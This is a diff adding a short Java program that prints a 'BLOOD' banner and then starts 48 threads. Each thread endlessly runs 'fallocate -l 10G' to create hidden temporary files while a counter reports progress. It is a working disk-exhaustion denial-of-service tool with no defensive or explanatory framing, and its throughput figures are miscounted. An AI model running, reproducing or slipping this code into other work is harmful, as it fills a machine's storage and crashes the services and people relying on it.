@@ -1,0 +1,49 @@
+import java.util.UUID;
+
+public class Main {
+   public static long megabytes = 0L;
+   public static long curr = 0L;
+
+   public static void main(String[] args) {
+      try {
+         System.out.println("### ##   ####      ## ##    ## ##   ### ##   \n ##  ##   ##      ##   ##  ##   ##   ##  ##  \n ##  ##   ##      ##   ##  ##   ##   ##  ##  \n ## ##    ##      ##   ##  ##   ##   ##  ##  \n ##  ##   ##      ##   ##  ##   ##   ##  ##  \n ##  ##   ##  ##  ##   ##  ##   ##   ##  ##  \n### ##   ### ###   ## ##    ## ##   ### ##   \n                                             \n");
+         System.out.println("Mode: Runtime Fallocation Call");
+         System.out.println("Preparing...");
+
+         int displays;
+         for(displays = 0; displays < 48; ++displays) {
+            (new Thread(() -> {
+               try {
+                  while(true) {
+                     String target = ".___tmp_" + UUID.randomUUID();
+                     Runtime.getRuntime().exec("fallocate -l 10G " + target).waitFor();
+                     ++curr;
+                     ++megabytes;
+                  }
+               } catch (Throwable var1) {
+                  var1.printStackTrace();
+               }
+            })).start();
+         }
+
+         System.out.println("Started!");
+         displays = 0;
+
+         while(true) {
+            while(true) {
+               try {
+                  Thread.sleep(100L);
+                  System.gc();
+                  ++displays;
+                  System.out.println("Pulled total [ " + megabytes + " GiB ] with speed [ " + curr + " GiB/s ]");
+                  if (displays % 10 == 0) {
+                     curr = 0L;
+                  }
+               } catch (Throwable var3) {
+               }
+            }
+         }
+      } catch (Throwable var4) {
+      }
+   }
+}
